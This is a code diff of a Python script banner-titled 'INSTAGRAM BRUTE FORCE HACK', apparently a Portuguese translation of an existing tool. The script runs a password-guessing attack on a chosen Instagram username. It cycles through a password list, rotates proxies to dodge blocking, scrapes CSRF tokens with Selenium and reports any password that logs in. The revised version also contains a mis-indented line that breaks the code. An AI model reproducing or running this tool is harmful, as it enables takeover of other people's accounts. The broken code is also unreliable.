@@ -1,11 +1,3 @@
-
-'''
-TODO LIST:
-	Fix and make proxy function better
-	Sort code again
-	Add help function to all "Yes/no" questions
-	Add help  function to "Press enter to exit input"
-'''
 import requests
 import json
 import time
@@ -14,7 +6,7 @@ import random
 import sys
 from selenium import webdriver
 
-# Help function
+# Função de ajuda
 def Input(text):
     value = ''
     if sys.version_info.major > 2:
@@ -23,7 +15,7 @@ def Input(text):
         value = raw_input(text)
     return str(value)
 
-# The main class
+# A classe principal
 class Instabrute():
     def __init__(self, username, passwordsFile='password.txt'):
         self.username = username
@@ -31,33 +23,33 @@ class Instabrute():
         self.UsedProxys = []
         self.passwordsFile = passwordsFile
 
-        # Check if passwords file exists
+        # Verifica se o arquivo de senhas existe
         self.loadPasswords()
-        # Check if username exists
+        # Verifica se o nome de usuário existe
         self.IsUserExists()
 
-        UseProxy = Input('[*] Do you want to use a proxy (y/n): ').upper()
-        if (UseProxy == 'Y' or UseProxy == 'YES'):
+        UseProxy = Input('[*] Você deseja usar um proxy (s/n): ').upper()
+        if UseProxy == 'S' or UseProxy == 'SIM':
             self.randomProxy()
 
-    # Check if password file exists and check if it contains passwords
+    # Verifica se o arquivo de senhas existe e se contém senhas
     def loadPasswords(self):
         if os.path.isfile(self.passwordsFile):
             with open(self.passwordsFile) as f:
                 self.passwords = f.read().splitlines()
                 passwordsNumber = len(self.passwords)
-                if (passwordsNumber > 0):
-                    print('[*] %s Passwords loaded successfully' % passwordsNumber)
+                if passwordsNumber > 0:
+                    print('[*] %s senhas carregadas com sucesso' % passwordsNumber)
                 else:
-                    print('Password file is empty. Please add passwords to it.')
-                    Input('[*] Press enter to exit')
+                    print('O arquivo de senhas está vazio. Por favor, adicione senhas a ele.')
+                    Input('[*] Pressione Enter para sair')
                     exit()
         else:
-            print('Please create a passwords file named "%s"' % self.passwordsFile)
-            Input('[*] Press enter to exit')
+            print('Por favor, crie um arquivo de senhas com o nome "%s"' % self.passwordsFile)
+            Input('[*] Pressione Enter para sair')
             exit()
 
-    # Choose a random proxy from a list of proxies
+    # Escolhe um proxy aleatório de uma lista de proxies
     def randomProxy(self):
         plist = open('proxylist.txt').read().splitlines()
         proxy = random.choice(plist)
@@ -67,30 +59,30 @@ class Instabrute():
             self.UsedProxys.append(proxy)
         try:
             print('')
-            print('[*] Checking new IP...')
-            print('[*] Your public IP: %s' % requests.get('http://myexternalip.com/raw', proxies={"http": proxy, "https": proxy}, timeout=10.0).text)
+            print('[*] Verificando novo IP...')
+            print('[*] Seu IP público: %s' % requests.get('http://myexternalip.com/raw', proxies={"http": proxy, "https": proxy}, timeout=10.0).text)
         except Exception as e:
-            print('[*] Can\'t reach proxy "%s"' % proxy)
+            print('[*] Não foi possível alcançar o proxy "%s"' % proxy)
         print('')
 
-    # Check if the username exists on the Instagram server
+    # Verifica se o nome de usuário existe no servidor do Instagram
     def IsUserExists(self):
         r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
         if r.status_code == 404:
-            print('[*] User named "%s" not found' % self.username)
-            Input('[*] Press enter to exit')
+            print('[*] Usuário com o nome "%s" não encontrado' % self.username)
+            Input('[*] Pressione Enter para sair')
             exit()
         elif r.status_code == 200:
             return True
 
-    # Try to login with a password
+    # Tenta fazer login com uma senha
     def Login(self, password):
         sess = requests.Session()
 
         if len(self.CurrentProxy) > 0:
             sess.proxies = {"http": self.CurrentProxy, "https": self.CurrentProxy}
 
-        # Build request headers
+        # Constrói os cabeçalhos da solicitação
         sess.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '', 'ds_user_id': ''})
         sess.headers.update({
             'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
@@ -107,44 +99,45 @@ class Instabrute():
             'Accept-Encoding': 'gzip, deflate'
         })
 
-        # Initialize the Selenium WebDriver
+        # Inicializa o WebDriver do Selenium
         browser = webdriver.Chrome()
-        
-        # Open the Instagram website
+
+        # Abre o site do Instagram
         browser.get('https://www.instagram.com')
 
-        # Get the csrf token automatically
+        # Obtenha o token CSRF automaticamente
         csrf_token = browser.execute_script("return document.querySelector('input[name=\"csrf_token\"]').value")
 
-        # Update the session's headers with the csrf token
+        # Atualiza os cabeçalhos da sessão com o token CSRF
         sess.headers.update({'X-CSRFToken': csrf_token})
 
-        # Update token after enter to the site
+        # Atualiza o token após entrar no site
         r = sess.get('https://www.instagram.com/')
         sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
 
-# Atualiza o token após o login no site
-r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
-sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
+        # Atualiza o token após o login no site
+        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
+        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
 
-# Analisa a resposta
-data = json.loads(r.text)
+        # Analisa a resposta
+        data = json.loads(r.text)
 
-if data['status'] == 'fail':
-    print(data['message'])
+        if data['status'] == 'fail':
+            print(data['message'])
 
-    UseProxy = Input('[*] Você deseja usar um proxy (s/n): ').upper()
-    if UseProxy == 'S' or UseProxy == 'SIM':
-        print('[$] Tentando usar um proxy após a falha.')
-        self.randomProxy()  # Verifique isso, pode conter erros
-    return False
+            UseProxy = Input('[*] Você deseja usar um proxy (s/n): ').upper()
+            if UseProxy == 'S' or UseProxy == 'SIM':
+  print('[$] Tentando usar um proxy após a falha.')
+                self.randomProxy()  # Verifique isso, pode conter erros
+            return False
 
-# Retorna a sessão se a senha estiver correta
-if data['authenticated'] == True:
-    return sess
-else:
-    return False
+        # Retorna a sessão se a senha estiver correta
+        if data['authenticated'] == True:
+            return sess
+        else:
+            return False
 
+# Início do programa
 print("""\033[32;1m
    mm.           dM8
    YMMMb.       dMM8
@@ -154,16 +147,14 @@ print("""\033[32;1m
           MbdMP
       .dMMMMMM.P   -=[INSTAGRAM BRUTE FORCE HACK]=-
      dMM  MMMMMMM  -=[Wrench]=-
-     8MMMMMMMMMMI  -=[DEDSECt]=-
+     8MMMMMMMMMMI  -=[DEDSEC]=-
       YMMMMMMMMM   -=[INSTAGRAM: jeanpseven]=-
         MMMMMMP
        MxM .mmm
 
-
 """)
 
 print("""\033[31;1m
-
  /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
 | $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
 | $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
@@ -172,30 +163,29 @@ print("""\033[31;1m
 | $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
 | $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
 |_______/ |________/|_______/  \______/ |________/ \______/ 
-
 """)
-instabrute = Instabrute(Input('\033[32;1mPlease enter a username: '))
+
+instabrute = Instabrute(Input('\033[32;1mPor favor, insira um nome de usuário: '))
 
 try:
-    delayLoop = int(Input('\033[36;1m[*] Please add a delay between the brute force actions (in seconds): '))
+    delayLoop = int(Input('\033[36;1m[*] Por favor, adicione um atraso entre as ações de força bruta (em segundos): ')) 
 except Exception as e:
-    print('[*] Error, the software uses the default value "4"')
+    print('[*] Erro, o software usará o valor padrão "4"')
     delayLoop = 4
 print('')
 
 for password in instabrute.passwords:
     sess = instabrute.Login(password)
     if sess:
-        print('[*] Login success %s' % [instabrute.username, password])
+        print('[*] Login bem-sucedido %s' % [instabrute.username, password])
     else:
-        print('[*] Password incorrect [%s]' % password)
+        print('[*] Senha incorreta [%s]' % password)
 
     try:
         time.sleep(delayLoop)
     except KeyboardInterrupt:
-        WantToExit = str(Input('Type y/n to exit: ')).upper()
-        if WantToExit == 'Y' or WantToExit == 'YES':
+        WantToExit = str(Input('Digite s/n para sair: ')).upper()
+        if WantToExit == 'S' or WantToExit == 'SIM':
             exit()
         else:
             continue
-		
